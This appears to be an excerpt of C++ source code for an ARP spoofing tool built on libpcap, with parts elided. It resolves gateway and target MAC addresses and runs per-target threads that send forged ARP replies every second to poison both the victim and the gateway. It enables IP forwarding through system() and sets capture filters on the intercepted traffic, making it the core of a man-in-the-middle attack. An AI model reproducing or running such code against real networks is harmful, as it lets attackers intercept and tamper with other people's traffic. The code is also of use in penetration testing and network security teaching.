...
bool ArpSpoofer::initialize() {
    ...
    if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1)
        std::cerr << "Filter compile failed: " << pcap_geterr(handle) << std::endl;
    else
        pcap_setfilter(handle, &fp);
    
    if (!get_interface_mac(interface, attacker_mac)) {
        std::cerr << "Failed to get interface MAC: " << interface << std::endl;
        return false;
    }
    if (!get_interface_ip(interface, attacker_ip)) {
        std::cerr << "Failed to get interface IP: " << interface << std::endl;
        return false;
    }
    std::cout << "Interface " << interface << " opened successfully.\n";
    std::cout << "Interface MAC: " << mac_to_string(attacker_mac) << "\n";
    std::cout << "Interface IP: " << ip_to_string(attacker_ip) << "\n";
    return true;
}
...
bool ArpSpoofer::set_gateway(const std::string& gateway_ip_str_) {
    ...
    std::cout << "Attacker MAC: " << mac_to_string(attacker_mac) << "\n";
    std::cout << "Attacker IP: " << ip_to_string(attacker_ip) << "\n";
    std::cout << "Gateway IP: " << ip_to_string(gateway_ip) << "\n";
    
    if (!get_mac_from_ip(gateway_ip, gateway_mac)) {
        std::cerr << "Failed to get gateway MAC.\n";
        return false;
    }
    std::cout << "Gateway MAC: " << mac_to_string(gateway_mac) << "\n";
    return true;
}
...
bool ArpSpoofer::add_target(const std::string& target_ip_str) {
    ...
    if (!get_mac_from_ip(target->get_ip(), target_mac)) {
        std::cerr << "Failed to get target MAC: " << target_ip_str << "\n";
        return false;
    }
    target->set_mac(target_mac);
    std::cout << "Added spoof target - IP: " << target_ip_str 
...
bool ArpSpoofer::get_mac_from_ip(const u_int8_t* target_ip, u_int8_t* target_mac) {
    std::cout << "Searching MAC for IP: " << ip_to_string(target_ip) << "\n";
    ...
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        ...
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "Packet send failed: " << pcap_geterr(handle) << "\n";
            continue;
        }
        ...
        while (time(NULL) - start_time < 10) {
            ...
            if (memcmp(arp->spa, target_ip, 4) == 0) {
                ...
                std::cout << "Found MAC: " << mac_to_string(target_mac) << "\n";
                return true;
            }
        }
    }
...
bool ArpSpoofer::update_filter() {
    std::string filter_exp = "((arp or ip) and (host " + ip_to_string(gateway_ip);
    {
        std::lock_guard<std::mutex> lock(mutex);
    ...
    if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        std::cerr << "Filter compile failed: " << pcap_geterr(handle) << "\n";
        return false;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        std::cerr << "Filter set failed: " << pcap_geterr(handle) << "\n";
        return false;
    }
    std::cout << "Dynamic filter set: " << filter_exp << "\n";
    return true;
}

void ArpSpoofer::spoof_target_thread(SpoofTarget* target) {
    std::cout << "Starting periodic spoofing for target " << target->get_ip_str() << "\n";
    while (target->is_running()) {
        send_arp_spoofing_packet(target);
        sleep(1);
    }
    std::cout << "Stopping spoofing for target " << target->get_ip_str() << "\n";
}

void ArpSpoofer::send_arp_spoofing_packet(const SpoofTarget* target) {
    u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
    std::cout << "Spoofing " << target->get_ip_str() << ": using gateway IP.\n";
    ...
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
        ...
        std::cout << "Spoof packet sent to target " << target->get_ip_str() << "\n";
    
    std::cout << "Spoofing " << target->get_ip_str() << ": using target IP for gateway.\n";
    ...
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
        ...
        std::cout << "Spoof packet sent to gateway for target " << target->get_ip_str() << "\n";
}
...
void ArpSpoofer::send_recover_arp_packets() {
    ...
    for (auto& target : targets) {
        ...
        if (pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet)) != 0)
            std::cerr << "Failed to send recovery packet to gateway: " << pcap_geterr(handle) << "\n";
        else
            std::cout << "Recovery packet sent to gateway: " << target->get_ip_str() 
                      << " -> " << ip_to_string(gateway_ip) << "\n";
        ...
        if (pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0)
            std::cerr << "Failed to send recovery packet to target: " << pcap_geterr(handle) << "\n";
        else
            std::cout << "Recovery packet sent to target: " << ip_to_string(gateway_ip) 
                      << " -> " << target->get_ip_str() << "\n";
...
void ArpSpoofer::stop_all() {
    std::cout << "Stopping all spoofing...\n";
    send_recover_arp_packets();
    std::lock_guard<std::mutex> lock(mutex);
    for (auto& target : targets)
        target->stop_thread();
    std::cout << "All spoofing threads stopped.\n";
}

bool ArpSpoofer::enable_ip_forwarding() {
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    std::cout << "Enabled IP forwarding.\n";
    return true;
}

bool ArpSpoofer::disable_ip_forwarding() {
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
    std::cout << "Disabled IP forwarding.\n";
    return true;
}
